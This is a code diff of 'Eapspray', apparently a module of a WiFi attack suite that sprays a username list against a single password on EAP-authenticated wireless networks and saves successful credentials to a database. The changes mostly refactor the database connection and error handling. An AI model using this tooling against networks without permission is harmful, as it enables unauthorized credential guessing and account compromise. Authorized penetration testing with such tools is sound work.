@@ -2,30 +2,21 @@
 # Description: Performs a Spray Brute-force attack against the Extensible Authentication Protocol (EAP)
 # The Eapspray module is tailored to spray a list of usernames against a single password guess.
 # Author: Nick Sanzotta/@Beamr
-# Version: v 1.09252017
+# Version: v 1.09282017
 try:
 	import os, sys, threading, datetime, time
 	from wpa_supplicant.core import WpaSupplicantDriver
 	from twisted.internet.selectreactor import SelectReactor
 	from twisted.internet import task
 	from theme import *
+	from dbcommands import DB
 except Exception as e:
 	print('\n [!] EAPSPRAY - Error: ' % (e))
 	sys.exit(1)
 
-try:
-	from dbcommands import DB
-	import sqlite3
-	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # Thread Support
-	conn.text_factory = str # Interpret 8-bit bytestrings 
-	conn.isolation_level = None # Autocommit Mode
-	db = DB(conn)
-except Exception as e:
-	print(red('!')+'Could not connect to database: %s' % (e))
-	sys.exit(1)
 
 class eapSpray(threading.Thread):
-	def __init__(self, ssid, user, userList, password, ca_cert, ca_path, client_cert, supplicantInt, interface):
+	def __init__(self, db_path, ssid, user, userList, password, ca_cert, ca_path, client_cert, supplicantInt, interface):
 		threading.Thread.__init__(self)
 		self.setDaemon(1) # daemon
 		self.ssid = ssid
@@ -39,8 +30,10 @@ class eapSpray(threading.Thread):
 		self.interface = interface
 		self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
 		self.eapcreds_log = 'data/eapcreds/%s_%s.eapcreds' % (self.ssid, self.log_timestamp)
+		self.db_path = db_path
 
 	def run(self):
+		self.database_connect() # Connect to database
 		self.datafolders_check()
 		# Time Stamp for file creation
 		timestr = time.strftime("%Y%m%d-%H%M")
@@ -60,8 +53,6 @@ class eapSpray(threading.Thread):
 				user_counter +=1
 				# Time Stamp for each user
 				curr_time2 = time.time()
-				#DEBUG PRINT
-				# print(colors.green +'[*]' + colors.normal + 'Testing: ' + user + ":" + password )
 				network_cfg = {
 				        "disabled": 0, 
 				        "ssid": self.ssid,
@@ -86,7 +77,6 @@ class eapSpray(threading.Thread):
 				# Connect to Network Profile 0
 				self.interface.select_network(self.supplicantInt+'/Networks/0')	
 
-				# DEBUG: Print Current WPA CONF
 				# print('DEBUG: WPA CONF')
 				# print(interface.get_current_network())	
 				while True:
@@ -100,7 +90,11 @@ class eapSpray(threading.Thread):
 						print(' Attempts           :  [%s/%s]\n' % (user_counter, user_list_length))
 						userSuccess = user + ":" + self.password
 						successList.append(userSuccess)
-						db.eapspray_commit(self.ssid, user, self.password)
+						try:
+							self.db.eapspray_commit(self.ssid, user, self.password)
+						except Exception as e:
+							print(red('!')+'WARNING - (EAPSPRAY) Could not save to database: %s' % (e))
+							pass
 						# Remove from associated network, which results in state: 'inactive'
 						self.interface.remove_network(self.supplicantInt+'/Networks/0')
 						# Wait for inactive state, based on a timer.
@@ -144,7 +138,14 @@ class eapSpray(threading.Thread):
 			self.user.task_done()
 
 	def datafolders_check(self):
-		'''Creates eapcreds folder(s) if missing'''
+		# Creates eapcreds folder(s) if missing
 		eapcreds_directory = 'data/eapcreds'
 		if not os.path.exists(eapcreds_directory):
 			os.makedirs(eapcreds_directory)
+
+	def database_connect(self):
+		try:
+			self.db = DB(self.db_path)
+		except Exception as e:
+			print(red('!')+'WARNING - (EAPSPRAY) Could not connect to database: %s' % (e))
+			pass
